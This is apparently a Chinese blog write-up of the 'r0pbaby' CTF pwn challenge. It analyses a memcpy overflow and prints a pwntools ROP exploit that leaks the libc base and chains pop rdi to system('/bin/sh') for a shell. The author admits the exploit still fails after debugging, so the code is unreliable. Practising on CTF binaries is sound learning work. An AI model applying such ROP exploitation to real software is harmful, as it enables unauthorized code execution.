看了一个大佬之前演讲的ppt，其中说到pwn题很多都是套路，每一种类型都短期快速刷一些熟练一下，之后再去逐步学习；感觉很有道理，就按照大佬的slide里推荐的题目挨个看一看；



首先checksec

![image-20210424214013896](https://static.hack1s.fun/images/2021/04/24/image-20210424214013896.png)

运行程序可以看到主要是一个菜单

![image-20210424214123869](https://static.hack1s.fun/images/2021/04/24/image-20210424214123869.png)

虽然程序开启了PIE，但是选项1直接会给出libc的地址，选项2能够给出输入的函数的地址

也就不用为随机化的问题担心了

选项3是可以输入一个长度1024以下的字符串，用IDA打开看发现并不是输入本身的溢出

而是最后结束的时候有一个`memcpy`

![image-20210424214331911](https://static.hack1s.fun/images/2021/04/24/image-20210424214331911.png)

这里将输入的buf会覆盖给savedregs，savedregs是程序最开始的地方，指向的是`rbp+0h`

![image-20210424214756808](https://static.hack1s.fun/images/2021/04/24/image-20210424214756808.png)

感觉可以直接写exploit

```python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
io = process('./r0pbaby')
elf= ELF('./r0pbaby')

def sendbuffer(payload):
    io.recvuntil(':')
    io.sendline('3')
    io.recvuntil('): ')
    length = len(payload)
    io.sendline(str(length))
    io.sendline(payload)


io.recv()

pop_rdi = 0x26b72
# libc_elf = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
# hex(next(libc_elf.search(asm('pop rdi\n ret\n',arch='amd64',os='linux'))))

io.sendline('2')
io.recv()
io.sendline('system')
io.recvuntil('Symbol system: ')
system_addr = int(io.recvuntil('\n',drop=True),16)
success('System Addr : '+hex(system_addr))

libc = LibcSearcher('system',system_addr)
libc_base = system_addr - libc.dump('system')
success('Libc Base Addr: '+hex(libc_base))
bin_sh = libc_base + libc.dump('str_bin_sh')
success('binsh Addr: '+hex(bin_sh))

payload = b'a'*8 + p64(libc_base+pop_rdi) + p64(bin_sh) + p64(system_addr)
#gdb.attach(io)
sendbuffer(payload)
io.interactive()
```

结果debug了一晚上，搞不懂问题在哪



